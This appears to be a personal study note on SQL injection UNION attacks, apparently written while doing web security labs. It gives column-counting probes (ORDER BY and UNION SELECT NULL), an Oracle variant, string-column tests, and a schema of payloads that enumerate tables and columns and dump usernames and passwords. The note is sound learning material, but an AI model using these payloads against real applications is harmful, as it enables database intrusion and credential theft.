## SQL Union Attacks
For `UNION` query to work, two requirements must be met:
- The individual query must return same number of columns
- The data types in each column must be compatible
	- Find out number of columns 
	- Which column from original query is suitable data type to hold injected query
>[!Example]
>GET /filter?category=**Drinks**
GET /filter?category=**'UNION+SELECT+NULL,+NULL--+-**
Make sure to *encode the payload*

# Step 1 SQL Union Attack
## Identify Number of Columns
### Attack Method 1
Inject ORDER BY until an error occurs.  This might be a database error, blank page, or generic error, but it will be different from the other queries
```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--

```
### Attack Method 2
Column count mismatch causes database error when NULLs differ.
```sql
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```
## Oracle SQL Union Attack
```sql
' UNION SELECT NULL FROM DUAL--
```
---
# Step 2 SQL Union Attack
## Finding columns with a useful data type
A UNION-based SQL injection retrieves injected query results by identifying result columns that accept or are compatible with string data. Look out for errors that confirm  the vulnerability.

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```


>[!Note]
>NULL values are used in injected SELECT queries because they are compatible with all common data types, increasing the likelihood of successful execution when the injected query’s column count matches the original.
#SQLi 

## Generic Union SQL Attack Schema

| Attack Step                                        | Query                                                                                                |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| 1. List all DB tables                              | `' UNION SELECT Table_Name, NULL FROM information_schema.tables--`                                   |
| 2. List columns from chosen DB table               | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_phmnoo'--` |
| 3. List specific column(s) from chosen Table on DB | `' UNION SELECT username_cslnvp,password_dcnlub FROM users_phmnoo--`                                 |
### Example Step 1
![[Pasted image 20260202233939.png]]
This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
You can then query `information_schema.columns` to list the columns in individual tables:
### Example Step 2
![[Pasted image 20260202234009.png]]

